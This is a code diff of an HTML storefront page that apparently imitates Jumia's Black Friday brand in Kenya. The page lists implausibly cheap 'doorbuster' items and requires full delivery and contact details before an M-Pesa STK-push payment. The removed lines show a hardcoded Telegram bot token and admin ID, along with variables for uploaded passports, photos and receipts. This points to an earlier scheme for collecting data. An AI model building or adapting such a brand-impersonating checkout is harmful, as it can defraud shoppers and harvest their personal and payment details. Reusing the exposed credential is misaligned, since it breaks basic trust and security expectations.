+                            <img id="catImgShoes" src="" alt="Girls Shoes" onerror="handleImgFallback(this)" class="w-full h-full object-cover group-hover:scale-105 transition duration-300" />
+                        </div>
+                        <div class="bg-[#27272a] text-white text-center py-2 font-bold text-sm">Shoes</div>
+                    </div>
+
+                    <div onclick="selectDepartment('bags')" class="cursor-pointer group rounded-xl overflow-hidden border border-gray-200 shadow-sm hover:shadow-md transition">
+                        <div class="h-36 overflow-hidden bg-amber-100">
+                            <img id="catImgAccessories" src="" alt="Girls Accessories" onerror="handleImgFallback(this)" class="w-full h-full object-cover group-hover:scale-105 transition duration-300" />
+                        </div>
+                        <div class="bg-[#27272a] text-white text-center py-2 font-bold text-sm">Accessories</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ACTIVE FILTER STATUS BAR -->
+        <div id="activeFilterBanner" class="hidden bg-[#111111] text-white px-4 py-3 rounded-xl flex flex-wrap items-center justify-between gap-2">
+            <div class="text-sm font-bold" id="activeFilterText">Showing filtered products</div>
+            <button onclick="resetAllFilters()" class="bg-[#ffd200] text-black text-xs font-black px-3 py-1.5 rounded-lg uppercase">Clear All Filters</button>
+        </div>
+
+        <div id="catalogContainer" class="space-y-10"></div>
+
     </main>
 
-    <div id="card-export-host" class="card-export-host" aria-hidden="true"></div>
+    <!-- FOOTER -->
+    <footer class="bg-[#18181b] text-gray-300 mt-16 border-t-4 border-[#f68b1e]">
+        <div class="max-w-7xl mx-auto px-4 py-10 grid grid-cols-1 md:grid-cols-4 gap-8 text-sm">
+            <div>
+                <div class="flex items-center gap-1.5 mb-3">
+                    <span class="font-montserrat font-black text-2xl text-white">JUMIA</span>
+                    <span class="w-6 h-6 rounded-full bg-[#f68b1e] text-white flex items-center justify-center text-xs font-bold">★</span>
+                </div>
+                <p class="text-xs text-gray-400 leading-relaxed">
+                    Kenya's #1 Black Friday Online Shopping Destination. Shop Earpods, Ladies' Shoes, Jumpsuits, Sneakers, Formal Footwear, Home Organizers & Smartphones with fast nationwide delivery.
+                </p>
+            </div>
+            <div>
+                <h4 class="font-bold text-white uppercase text-xs tracking-wider mb-3">Top Categories</h4>
+                <ul class="space-y-2 text-xs">
+                    <li><button onclick="selectDepartment('ladies-shoes')" class="hover:text-[#ffd200]">Ladies' Shoes & Sneakers</button></li>
+                    <li><button onclick="selectDepartment('fashion')" class="hover:text-[#ffd200]">Women's Jumpsuits & Girls' Fashion</button></li>
+                    <li><button onclick="selectDepartment('bags')" class="hover:text-[#ffd200]">Bags & Accessories</button></li>
+                    <li><button onclick="selectDepartment('audio')" class="hover:text-[#ffd200]">Wireless Earpods & Audio</button></li>
+                </ul>
+            </div>
+            <div>
+                <h4 class="font-bold text-white uppercase text-xs tracking-wider mb-3">Payment Method</h4>
+                <div class="flex flex-wrap gap-2 text-xs font-bold">
+                    <span class="bg-green-700 text-white px-2.5 py-1 rounded">📱 M-PESA Express — Secure STK Push</span>
+                </div>
+                <p class="text-[10px] text-gray-400 mt-2">All orders are paid instantly via M-Pesa before delivery.</p>
+            </div>
+            <div>
+                <h4 class="font-bold text-white uppercase text-xs tracking-wider mb-3">Store Tools</h4>
+                <button onclick="openImageManager()" class="bg-[#f68b1e] hover:bg-[#e07b12] text-white font-bold text-xs px-4 py-2.5 rounded-lg transition">
+          Customize External Image Links
+        </button>
+            </div>
+        </div>
+        <div class="bg-black/50 text-center py-4 text-xs text-gray-500">
+            © 2026 Jumia Black Friday Storefront Demo • Nairobi, Kenya
+        </div>
+    </footer>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js" crossorigin="anonymous"></script>
+    <!-- SIZE PICKER MODAL -->
+    <div id="sizeModal" class="fixed inset-0 z-50 hidden bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-4">
+            <div class="flex items-start justify-between gap-3">
+                <div>
+                    <span class="text-[11px] font-black uppercase text-[#f68b1e]">Select Variation</span>
+                    <h3 id="sizeModalTitle" class="font-bold text-lg text-gray-900">Product Name</h3>
+                    <p id="sizeModalPrice" class="font-montserrat font-black text-xl text-[#e01b24]">KES 0</p>
+                </div>
+                <button onclick="closeSizeModal()" class="text-gray-400 hover:text-black font-bold text-xl">✕</button>
+            </div>
+            <div>
+                <p class="text-xs font-bold text-gray-600 mb-2">Choose Size:</p>
+                <div id="sizeModalOptions" class="flex flex-wrap gap-2"></div>
+            </div>
+            <button onclick="confirmSizeAdd()" class="w-full bg-[#f68b1e] hover:bg-[#e07b12] text-white font-extrabold py-3 rounded-xl uppercase tracking-wide shadow transition">
+        Add To Cart
+      </button>
+        </div>
+    </div>
+
+    <!-- SLIDE-OUT SHOPPING CART, DELIVERY INFO & M-PESA STK PUSH CHECKOUT -->
+    <div id="cartDrawer" class="fixed inset-0 z-50 hidden">
+        <div onclick="closeCart()" class="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
+        <div class="absolute right-0 top-0 bottom-0 w-full max-w-md bg-white shadow-2xl flex flex-col">
+
+            <!-- FIXED HEADER -->
+            <div class="bg-[#111111] text-white px-5 py-4 flex items-center justify-between shrink-0">
+                <div class="flex items-center gap-2">
+                    <span class="font-montserrat font-black text-lg text-[#ffd200]">YOUR CART</span>
+                    <span id="drawerCartCount" class="bg-[#f68b1e] text-white text-xs font-extrabold px-2 py-0.5 rounded-full">0</span>
+                </div>
+                <button onclick="closeCart()" class="text-gray-300 hover:text-white text-xl font-bold">✕</button>
+            </div>
+
+            <!-- FREE DELIVERY PROGRESS BAR -->
+            <div class="bg-orange-50 px-5 py-2.5 border-b border-orange-200 text-xs shrink-0">
+                <p id="freeShipText" class="font-bold text-gray-800 mb-1.5">Add KES 1,999 more for FREE Nairobi delivery!</p>
+                <div class="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
+                    <div id="freeShipBar" class="h-full bg-[#f68b1e] transition-all duration-300" style="width: 0%"></div>
+                </div>
+            </div>
+
+            <!-- SCROLLABLE BODY -->
+            <div id="cartScrollBody" class="flex-1 overflow-y-auto">
+                <!-- Cart Items List -->
+                <div id="cartItemsList" class="p-5 space-y-3"></div>
+
+                <!-- STEP 1: Delivery Information & Contacts (required before payment) -->
+                <div id="deliveryInfoSection" class="border-t border-gray-200 p-5 bg-orange-50/60 space-y-3">
+                    <div class="flex items-center justify-between gap-2">
+                        <h4 class="font-montserrat font-black text-sm text-[#111111] uppercase tracking-wide">📦 Delivery Information & Contacts</h4>
+                        <span class="text-[10px] font-black bg-[#e01b24] text-white px-2 py-0.5 rounded uppercase">Required</span>
+                    </div>
+
+                    <div class="grid grid-cols-1 gap-2.5">
+                        <div>
+                            <input id="delivFullName" type="text" placeholder="Full Name * (e.g. Jane Wanjiku)" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-[#f68b1e]" />
+                            <p class="hidden text-[10px] text-[#e01b24] font-bold mt-0.5" data-err-for="delivFullName">Please enter your full name</p>
+                        </div>
+                        <div>
+                            <input id="delivPhone" type="tel" placeholder="Phone Number * (e.g. 0712 345 678)" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-[#f68b1e]" />
+                            <p class="hidden text-[10px] text-[#e01b24] font-bold mt-0.5" data-err-for="delivPhone">Enter a valid Kenyan phone (07XX / 01XX, 10 digits)</p>
+                        </div>
+                        <div>
+                            <input id="delivEmail" type="email" placeholder="Email Address (optional, for order updates)" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-[#f68b1e]" />
+                            <p class="hidden text-[10px] text-[#e01b24] font-bold mt-0.5" data-err-for="delivEmail">Enter a valid email address</p>
+                        </div>
+                        <div>
+                            <input id="delivAddress" type="text" placeholder="Delivery Address * (estate, street, house/apt no.)" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-[#f68b1e]" />
+                            <p class="hidden text-[10px] text-[#e01b24] font-bold mt-0.5" data-err-for="delivAddress">Please enter your delivery address</p>
+                        </div>
+                        <div class="grid grid-cols-2 gap-2.5">
+                            <div>
+                                <input id="delivCity" type="text" placeholder="City / Town * (e.g. Nairobi)" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-[#f68b1e]" />
+                                <p class="hidden text-[10px] text-[#e01b24] font-bold mt-0.5" data-err-for="delivCity">City/Town is required</p>
+                            </div>
+                            <div>
+
+                                <select id="delivRegion" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg bg-white focus:outline-none focus:border-[#f68b1e]">
+    <option value="">Select County</option>
+    <option value="mombasa">Mombasa</option>
+    <option value="kwale">Kwale</option>
+    <option value="kilifi">Kilifi</option>
+    <option value="tana-river">Tana River</option>
+    <option value="lamu">Lamu</option>
+    <option value="taita-taveta">Taita Taveta</option>
+    <option value="garissa">Garissa</option>
+    <option value="wajir">Wajir</option>
+    <option value="mandera">Mandera</option>
+    <option value="marsabit">Marsabit</option>
+    <option value="isiolo">Isiolo</option>
+    <option value="meru">Meru</option>
+    <option value="tharaka-nithi">Tharaka Nithi</option>
+    <option value="embu">Embu</option>
+    <option value="kitui">Kitui</option>
+    <option value="machakos">Machakos</option>
+    <option value="makueni">Makueni</option>
+    <option value="nyandarua">Nyandarua</option>
+    <option value="nyeri">Nyeri</option>
+    <option value="kirinyaga">Kirinyaga</option>
+    <option value="muranga">Murang'a</option>
+    <option value="kiambu">Kiambu</option>
+    <option value="turkana">Turkana</option>
+    <option value="west-pokot">West Pokot</option>
+    <option value="samburu">Samburu</option>
+    <option value="trans-nzoia">Trans Nzoia</option>
+    <option value="uasin-gishu">Uasin Gishu</option>
+    <option value="elgeyo-marakwet">Elgeyo Marakwet</option>
+    <option value="nandi">Nandi</option>
+    <option value="baringo">Baringo</option>
+    <option value="laikipia">Laikipia</option>
+    <option value="nakuru">Nakuru</option>
+    <option value="narok">Narok</option>
+    <option value="kajiado">Kajiado</option>
+    <option value="kericho">Kericho</option>
+    <option value="bomet">Bomet</option>
+    <option value="kakamega">Kakamega</option>
+    <option value="vihiga">Vihiga</option>
+    <option value="bungoma">Bungoma</option>
+    <option value="busia">Busia</option>
+    <option value="siaya">Siaya</option>
+    <option value="kisumu">Kisumu</option>
+    <option value="homa-bay">Homa Bay</option>
+    <option value="migori">Migori</option>
+    <option value="kisii">Kisii</option>
+    <option value="nyamira">Nyamira</option>
+    <option value="nairobi">Nairobi</option>
+</select>
+
+                            </div>
+                        </div>
+                        <div>
+                            <textarea id="delivNotes" rows="2" placeholder="Delivery Notes (optional: landmark, gate code, call on arrival...)" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-[#f68b1e] resize-none"></textarea>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 2: M-PESA Payment -->
+                <div id="paymentSection" class="border-t border-gray-200 p-5 bg-gray-50 space-y-3">
+                    <div class="space-y-1 text-sm">
+                        <div class="flex justify-between text-gray-600">
+                            <span>Subtotal</span>
+                            <span id="cartSubtotal" class="font-bold text-gray-900">KES 0</span>
+                        </div>
+                        <div class="flex justify-between text-gray-600">
+                            <span>Delivery Fee</span>
+                            <span id="cartShipping" class="font-bold text-gray-900">KES 100</span>
+                        </div>
+                    </div>
+
+                    <!-- M-PESA Only -->
+                    <div class="rounded-lg border-2 border-green-600 bg-green-50 p-3 flex items-center justify-between gap-2">
+                        <div class="flex items-center gap-2">
+                            <span class="text-xl">📱</span>
+                            <div>
+                                <p class="font-extrabold text-xs text-green-800 uppercase">M-PESA Express</p>
+                                <p class="text-[10px] text-green-700 font-bold">Pay instantly via STK Push</p>
+                            </div>
+                        </div>
+                        <span class="text-[10px] font-black bg-green-600 text-white px-2 py-0.5 rounded-full uppercase">Selected</span>
+                    </div>
+
+                    <div>
+                        <input id="mpesaPhoneInput" type="tel" placeholder="M-Pesa Number for STK Push * (e.g. 0712 345 678)" class="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:border-green-600" />
+                        <p id="mpesaPhoneErr" class="hidden text-[10px] text-[#e01b24] font-bold mt-0.5">Enter a valid Safaricom M-Pesa number (07XX / 01XX)</p>
+                    </div>
+
+                    <p id="deliveryRequiredHint" class="hidden text-[10px] font-black text-[#e01b24] bg-red-50 border border-red-200 rounded-lg px-3 py-2">
+                        ⚠ Please fill in ALL required delivery & contact details above before completing your order.
+                    </p>
+
+                    <!-- Live payment status line -->
+                    <div id="paymentStatusBox" class="hidden rounded-lg px-3 py-2.5 text-xs font-bold space-y-1"></div>
+                </div>
+            </div>
+
+            <!-- STICKY FOOTER: Total + Pay via M-Pesa -->
+            <div class="border-t-2 border-[#f68b1e] bg-white px-5 py-4 shrink-0 space-y-2.5">
+                <div class="flex justify-between text-base font-black text-gray-900">
+                    <span>Total</span>
+                    <span id="cartTotal" class="text-[#e01b24]">KES 0</span>
+                </div>
+                <button onclick="processCheckout()" id="checkoutBtn" class="w-full bg-[#f68b1e] hover:bg-[#e07b12] text-white font-montserrat font-black py-3.5 rounded-xl uppercase tracking-wide shadow-lg transition flex items-center justify-center gap-2">
+          <span id="checkoutBtnLabel">📱 Pay with M-Pesa</span>
+        </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- EXTERNAL IMAGE URL MANAGER MODAL -->
+    <div id="imageManagerModal" class="fixed inset-0 z-50 hidden bg-black/70 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl max-w-3xl w-full max-h-[88vh] flex flex-col shadow-2xl overflow-hidden">
+            <div class="bg-[#111111] text-white px-6 py-4 flex items-center justify-between">
+                <div>
+                    <h3 class="font-montserrat font-black text-lg text-[#ffd200]">EXTERNAL IMAGE URL MANAGER</h3>
+                    <p class="text-xs text-gray-300">Paste any external HTTPS image address link (`https://...`) to update storefront visuals live.</p>
+                </div>
+                <button onclick="closeImageManager()" class="text-gray-300 hover:text-white text-xl font-bold">✕</button>
+            </div>
+
+            <div class="p-4 border-b border-gray-200 bg-gray-50 flex flex-wrap items-center justify-between gap-2">
+                <input id="imgManagerSearch" oninput="renderImageManagerList()" type="text" placeholder="Filter items by name..." class="px-3 py-2 border border-gray-300 rounded-lg text-xs flex-1 min-w-[200px]" />
+                <button onclick="resetCustomImages()" class="px-3 py-2 bg-red-100 hover:bg-red-200 text-red-700 font-bold text-xs rounded-lg">Reset All to Defaults</button>
+            </div>
+
+            <div id="imageManagerList" class="flex-1 overflow-y-auto p-5 space-y-3"></div>
+
+            <div class="p-4 border-t border-gray-200 bg-gray-50 flex justify-end gap-2">
+                <button onclick="closeImageManager()" class="px-5 py-2.5 bg-[#111111] text-white font-bold text-xs rounded-lg uppercase">Done</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST NOTIFICATION -->
+    <div id="toast" class="fixed bottom-5 left-1/2 -translate-x-1/2 z-50 hidden bg-[#111111] text-white px-5 py-3 rounded-full shadow-2xl border border-[#ffd200] text-xs sm:text-sm font-bold flex items-center gap-2">
+        <span class="text-[#ffd200]">✔</span>
+        <span id="toastMsg">Added to cart!</span>
+    </div>
+
     <script>
-        const CONFIG = {
-            telegramToken: "9134634581:AAGl1PFYqIrE1o3MFznPiAPpxbBolwqxi_4",
-            adminTelegramId: "8731453872"
+        // =========================================================================
+        // 0. PAYHERO BACKEND CONFIGURATION
+        //    server.js mounts routes/payhero.js under /api/payhero,
+        //    so the STK push endpoint is:  POST /api/payhero/stk-push
+        //    Body: { phone_number: "2547XXXXXXXX", amount: <integer KES> }
+        // =========================================================================
+        const STK_PUSH_ENDPOINT = "/api/payhero/stk-push";
+
+        // =========================================================================
+        // 1. DEFAULT EXTERNAL HTTPS IMAGE LINKS
+        // =========================================================================
+        const FALLBACK_IMAGE = "https://images.unsplash.com/photo-1607082348824-0a96f2a4b9da?auto=format&fit=crop&w=600&q=80";
+
+        const DEFAULT_BANNER_IMAGES = {
+            heroEarpods: "https://images.unsplash.com/photo-1606220588913-b3aacb4d2f46?auto=format&fit=crop&w=600&q=80",
+            heroShoes: "https://images.unsplash.com/photo-1543163521-1bf539c55dd2?auto=format&fit=crop&w=600&q=80",
+            heroJumpsuit: "https://images.unsplash.com/photo-1595777457583-95e059d581b8?auto=format&fit=crop&w=600&q=80",
+            catClothes: "https://images.unsplash.com/photo-1518831959646-742c3a14ebf7?auto=format&fit=crop&w=600&q=80",
+            catShoes: "https://images.unsplash.com/photo-1514989940723-e8e51635b782?auto=format&fit=crop&w=600&q=80",
+            catAccessories: "https://images.unsplash.com/photo-1553062407-98eeb64c6a62?auto=format&fit=crop&w=600&q=80"
         };
 
-        let paymentUnlocked = false;
-        let uploadedPhotoDataURL = null;
-        let uploadedReceiptDataURL = null;
-        let countdownTimerInterval = null;
-        let botPollingInterval = null;
-        let lastUpdateId = 0;
-        let currentPassport = "";
+        const POSTER_DEAL_IDS = ["poster-earpods", "poster-heels", "poster-jumpsuit"];
 
-        const currencyRates = {
-            "United Kingdom": {
-                symbol: "£",
-                rate: 0.85,
-                code: "GBP"
+        const SHOE_SIZES = ["37", "38", "39", "40", "41", "42"];
+        const CLOTH_SIZES = ["XS", "S", "L", "XL", "XXL"];
+
+        const DEPARTMENTS = [{
+            id: "ladies-shoes",
+            title: "👠 Ladies' Shoes & Sneakers",
+            subtitle: "Stilettos, breathable mesh runners, chunky platforms & everyday work flats"
+        }, {
+            id: "fashion",
+            title: "👗 Women's & Girls' Fashion",
+            subtitle: "Black Friday jumpsuits, girls' outfits, cotton multipacks & biker shorts"
+        }, {
+            id: "bags",
+            title: "👜 Bags & Accessories",
+            subtitle: "Shoulder totes, crossbody bags, backpacks, clutches & wallets"
+        }, {
+            id: "mens-formal",
+            title: "👞 Men's Formal & Loafers",
+            subtitle: "Double monk straps, polished oxfords, business loafers & slip-ons"
+        }, {
+            id: "mens-sneakers",
+            title: "👟 Men's Sneakers & Football Cleats",
+            subtitle: "Air cushion sneakers, Puma runners, high-top boots & grip socks"
+        }, {
+            id: "kids-shoes",
+            title: "🧒 Kids' Shoes",
+            subtitle: "Velcro running sneakers, breathable school shoes & LED trainers"
+        }, {
+            id: "audio",
+            title: "🎧 Earpods & Wireless Audio",
+            subtitle: "itel BudsFit, TWS pods, gaming earbuds, neckbands & Bluetooth speakers"
+        }, {
+            id: "home-fitness",
+            title: "🏠 Home Organizers, Fitness & Phones",
+            subtitle: "Multi-tier shoe racks, spin bikes, knee supports & Xiaomi smartphones"
+        }];
+
+        // -------------------------------------------------------------------------
+        // PRODUCT HELPER
+        // -------------------------------------------------------------------------
+        let seq = 0;
+
+        function P(dept, badge, express, name, price, oldPrice, rating, reviews, sizes, imgId) {
+            seq++;
+            return {
+                id: `${dept.slice(0, 2)}-bf-${seq}`,
+                dept,
+                badge,
+                express,
+                name,
+                price,
+                oldPrice,
+                rating,
+                reviews,
+                sizes,
+                image: `https://images.unsplash.com/${imgId}?auto=format&fit=crop&w=600&q=80`
+            };
+        }
+
+        const PRODUCTS = [
+            // --- POSTER DOORBUSTERS ---
+            {
+                id: "poster-earpods",
+                dept: "audio",
+                badge: "Black Friday Deal",
+                express: true,
+                name: "Pro Wireless Bluetooth Earpods with Charging Case",
+                price: 99,
+                oldPrice: 1200,
+                rating: 4.8,
+                reviews: 1420,
+                sizes: ["Standard"],
+                image: "https://images.unsplash.com/photo-1606220588913-b3aacb4d2f46?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "poster-heels",
+                dept: "ladies-shoes",
+                badge: "Black Friday Deal",
+                express: true,
+                name: "Ladies' Blush Pink Bow Stiletto Pointed Heels",
+                price: 200,
+                oldPrice: 2400,
+                rating: 4.7,
+                reviews: 890,
+                sizes: ["37", "38", "39", "40", "41", "42"],
+                image: "https://images.unsplash.com/photo-1543163521-1bf539c55dd2?auto=format&fit=crop&w=600&q=80"
+            }, {
+                id: "poster-jumpsuit",
+                dept: "fashion",
+                badge: "Black Friday Deal",
+                express: true,
+                name: "Ladies' Burgundy Flutter-Sleeve Belted Jumpsuit",
+                price: 200,
+                oldPrice: 2200,
+                rating: 4.9,
+                reviews: 1150,
+                sizes: ["XS", "S", "L", "XL", "XXL"],
+                image: "https://images.unsplash.com/photo-1595777457583-95e059d581b8?auto=format&fit=crop&w=600&q=80"
             },
-            "United States": {
-                symbol: "$",
-                rate: 1.08,
-                code: "USD"
+
+            // =========================================================================
+            // LADIES' SHOES & SNEAKERS — 20 ITEMS
+            // =========================================================================
+            P("ladies-shoes", "Black Friday Deal", true, "AIGALU Ladies Sneakers Casual Breathable White/Red", 1020, 1850, 4.5, 312, SHOE_SIZES, "photo-1595950653106-6c9ebd614d3a"),
+            P("ladies-shoes", "Black Friday Deal", true, "Ladies Everything Girls Black White-Stripe Sneakers", 1199, 2100, 4.6, 204, SHOE_SIZES, "photo-1542291026-7eec264c27ff"),
+            P("ladies-shoes", "Black Friday Deal", true, "Women Z-Platform Chunky White Fashion Sneakers", 1268, 2300, 4.7, 418, SHOE_SIZES, "photo-1560769629-975ec94e6a86"),
+            P("ladies-shoes", "Black Friday Deal", true, "Berrykey Women's Casual Breathable Mesh Sneakers", 774, 1599, 4.4, 529, SHOE_SIZES, "photo-1551107696-a4b0c5a0d9a2"),
+            P("ladies-shoes", "Top Deal", true, "Women's Sky-Blue Denim Canvas Lace-Up Sneakers", 928, 1700, 4.5, 164, SHOE_SIZES, "photo-1525966222134-fcfa99b8ae77"),
+            P("ladies-shoes", "Hot Deal", true, "Ladies Metallic Gold Casual Lace-Up Fashion Shoes", 1190, 2200, 4.6, 95, SHOE_SIZES, "photo-1515955656352-a1fa3ffcd111"),
+            P("ladies-shoes", "Black Friday Deal", true, "Lady Sport Pink Breathable Fitness Running Shoes", 390, 1100, 4.3, 612, SHOE_SIZES, "photo-1539185441755-769473a23570"),
+            P("ladies-shoes", "Black Friday Deal", true, "Ladies Sports Plus Size (37-42) Air-Sole Slip-On", 1419, 2450, 4.8, 340, SHOE_SIZES, "photo-1584735175315-9d5df23860e6"),
+            P("ladies-shoes", "Black Friday Deal", true, "Women's Nude Pointed-Toe Court Heels Office Wear", 899, 1900, 4.6, 278, SHOE_SIZES, "photo-1543163521-1bf539c55dd2"),
+            P("ladies-shoes", "New Arrival", true, "Ladies Red Patent Mary Jane Block Heels Party Shoes", 1150, 2300, 4.5, 187, SHOE_SIZES, "photo-1603487742131-4160ec999306"),
+            P("ladies-shoes", "Black Friday Deal", true, "Women's Black Strappy Ankle-Boot Zipper Mid-Heels", 1349, 2600, 4.7, 402, SHOE_SIZES, "photo-1543163521-1bf539c55dd2"),
+            P("ladies-shoes", "Comfort Pick", true, "Ladies Cushioned White Nursing Work Clogs Slides", 699, 1400, 4.4, 566, SHOE_SIZES, "photo-1584735175315-9d5df23860e6"),
+            P("ladies-shoes", "Trending", true, "Women's Beige Espadrille Rope Wedge Sandals", 850, 1750, 4.5, 143, SHOE_SIZES, "photo-1595950653106-6c9ebd614d3a"),
+            P("ladies-shoes", "Black Friday Deal", true, "Ladies White Tennis Court Sneakers Lightweight", 1099, 2000, 4.6, 355, SHOE_SIZES, "photo-1542291026-7eec264c27ff"),
+            P("ladies-shoes", "Flash Sale", true, "Glitter Rhinestone Evening Party Heels Silver 9cm", 1599, 3100, 4.8, 96, SHOE_SIZES, "photo-1560769629-975ec94e6a86"),
+            P("ladies-shoes", "Everyday Wear", true, "Ladies Soft Leather Ballet Flats Slip-On Round Toe", 640, 1299, 4.3, 421, SHOE_SIZES, "photo-1525966222134-fcfa99b8ae77"),
+            P("ladies-shoes", "Black Friday Deal", true, "Women's Chunky Lug-Sole Combat Boots Lace-Up Black", 1899, 3400, 4.7, 233, SHOE_SIZES, "photo-1551107696-a4b0c5a0d9a2"),
+            P("ladies-shoes", "Hot Deal", true, "Ladies Knit Sock Sneakers Slip-On Stretch Ultra Light", 975, 1899, 4.5, 301, SHOE_SIZES, "photo-1539185441755-769473a23570"),
+            P("ladies-shoes", "Black Friday Deal", true, "Women's Tan Brown Leather Brogue Oxford Flats", 1210, 2250, 4.6, 178, SHOE_SIZES, "photo-1515955656352-a1fa3ffcd111"),
+            P("ladies-shoes", "Mega Sale", true, "Ladies Fuchsia Sport Trainers Air-Mesh Gym Shoes", 830, 1650, 4.4, 512, SHOE_SIZES, "photo-1584735175315-9d5df23860e6"),
+
+            // =========================================================================
+            // BAGS & ACCESSORIES — 20 ITEMS
+            // =========================================================================
+            P("bags", "3-in-1 Set", true, "Girls 3-in-1 Pink Canvas School Backpack & Pouch Set", 1020, 2100, 4.8, 540, ["Standard"], "photo-1553062407-98eeb64c6a62"),
+            P("bags", "Best Seller", true, "2-in-1 Ladies PU Leather Tote Bag + Mini Wallet", 639, 1450, 4.6, 780, ["Standard"], "photo-1584917865442-de89df76afd3"),
+            P("bags", "Black Friday Deal", true, "Fashionable Ladies Quilted Chain Shoulder Crossbody", 620, 1399, 4.7, 412, ["Standard"], "photo-1566150905458-1bf1fc113f0d"),
+            P("bags", "Black Friday Deal", true, "Men's Water-Resistant Laptop Business Backpack 15.6 Inch", 1450, 2900, 4.7, 655, ["Standard"], "photo-1547949003-9792a18a2601"),
+            P("bags", "Hot Deal", true, "Ladies Woven Straw Beach Tote Bag with Tassel Charm", 549, 1150, 4.4, 208, ["Standard"], "photo-1544816155-12df9643f363"),
+            P("bags", "New Arrival", true, "Unisex Mini Chest Sling Crossbody Sports Bag", 470, 999, 4.5, 334, ["Standard"], "photo-1590874103328-eac38a683ce7"),
+            P("bags", "Black Friday Deal", true, "Luxury Ladies Crocodile-Pattern Handbag Gold Buckle", 1350, 2800, 4.8, 191, ["Standard"], "photo-1575032617751-6ddec2089882"),
+            P("bags", "Travel Pick", true, "Foldable Travel Duffel Weekender Bag Large Capacity", 899, 1800, 4.6, 289, ["Standard"], "photo-1591561954557-26941169b49e"),
+            P("bags", "Under 500", true, "Canvas Casual Student Shoulder Messenger Bag Unisex", 420, 899, 4.3, 470, ["Standard"], "photo-1596149615231-55728beadc55"),
+            P("bags", "Black Friday Deal", true, "Ladies Velvet Evening Clutch Purse with Pearl Handle", 380, 850, 4.6, 152, ["Standard"], "photo-1559563458-527698bf5295"),
+            P("bags", "Best Seller", true, "Waterproof Nylon Diaper Bag Mom Backpack Multi-Pocket", 1180, 2400, 4.8, 396, ["Standard"], "photo-1548863227-3af567fc3b25"),
+            P("bags", "Gift Set", true, "Ladies Wallet Purse Set 3pcs Cardholder + Coin Purse", 520, 1100, 4.5, 244, ["Standard"], "photo-1576566588028-4147f3842f27"),
+            P("bags", "Black Friday Deal", true, "Men's Genuine Leather Belt Bag Fanny Pack Adjustable", 460, 950, 4.4, 176, ["Standard"], "photo-1614179689702-45a4b0df2b7a"),
+            P("bags", "Trending", true, "Clear Transparent PVC Crossbody Stadium-Approved Bag", 340, 750, 4.2, 388, ["Standard"], "photo-1622560480605-d83c853bc5c3"),
+            P("bags", "Black Friday Deal", true, "Kids' Cartoon Dinosaur Kindergarten Backpack Lightweight", 390, 820, 4.7, 523, ["Standard"], "photo-1553062407-98eeb64c6a62"),
+            P("bags", "Office Pick", true, "Women's Structured Briefcase Tote Laptop Work Bag", 1599, 3200, 4.8, 128, ["Standard"], "photo-1584917865442-de89df76afd3"),
+            P("bags", "Hot Deal", true, "Retro Rucksack Drawstring Bucket Backpack Unisex Brown", 690, 1400, 4.5, 215, ["Standard"], "photo-1566150905458-1bf1fc113f0d"),
+            P("bags", "Flash Sale", true, "Ladies Sequin Party Mini Handbag Glitter Chain Strap", 449, 990, 4.4, 302, ["Standard"], "photo-1566150905458-1bf1fc113f0d"),
+            P("bags", "Black Friday Deal", true, "Duffel Gym Bag with Shoes Compartment & Wet Pocket", 980, 1999, 4.6, 351, ["Standard"], "photo-1547949003-9792a18a2601"),
+            P("bags", "Mega Sale", true, "Anti-Theft Backpack USB Charging Port & Hidden Zipper", 1250, 2600, 4.7, 467, ["Standard"], "photo-1547949003-9792a18a2601"),
+
+            // =========================================================================
+            // EARPODS & WIRELESS AUDIO — 20 ITEMS
+            // =========================================================================
+            P("audio", "Official Store", true, "itel TWS BudsFit 5 Earbuds IPX5 Water Splash Proof", 1899, 2800, 4.8, 512, ["Standard"], "photo-1590658268037-6bf12165a8df"),
+            P("audio", "Top Rated", true, "RichRipple Pro2 Bluetooth Wireless Pods (Black/Pink/Blue)", 389, 999, 4.5, 2410, ["Standard"], "photo-1610465299993-e6675c9f9efa"),
+            P("audio", "Gaming Audio", true, "TWS N35 Wireless Bluetooth 5.3 Deep Bass Gaming Earbuds", 831, 1650, 4.6, 670, ["Standard"], "photo-1631867675167-90a456a90863"),
+            P("audio", "LED Display", true, "SmartKits M25 PLUS Wireless Earbuds with Powerbank Case", 428, 1200, 4.4, 890, ["Standard"], "photo-1572569511254-d8f925fe2cbb"),
+            P("audio", "Black Friday Deal", true, "Oraimo FreePods-4 ENC True Wireless Earbuds 45H Play", 2350, 3800, 4.8, 733, ["Standard"], "photo-1608156639585-b4a8797ab72c"),
+            P("audio", "Hot Deal", true, "TWS Pro 6 Wireless Pods Touch Control HD Mic White", 350, 899, 4.3, 1890, ["Standard"], "photo-1606220588913-b3aacb4d2f46"),
+            P("audio", "Black Friday Deal", true, "MingCerene LED Display Bluetooth 5.3 Earbuds HiFi Bass", 520, 1150, 4.5, 806, ["Standard"], "photo-1590658268037-6bf12165a8df"),
+            P("audio", "New Arrival", true, "Lenovo LP40 Pro TWS Earbuds Ultra-Light Half In-Ear", 749, 1500, 4.6, 1105, ["Standard"], "photo-1610465299993-e6675c9f9efa"),
+            P("audio", "Flash Sale", true, "Sport Neckband Bluetooth Headphones Magnetic Earbuds", 680, 1450, 4.4, 590, ["Standard"], "photo-1613040809024-b4ef7ba99bcd"),
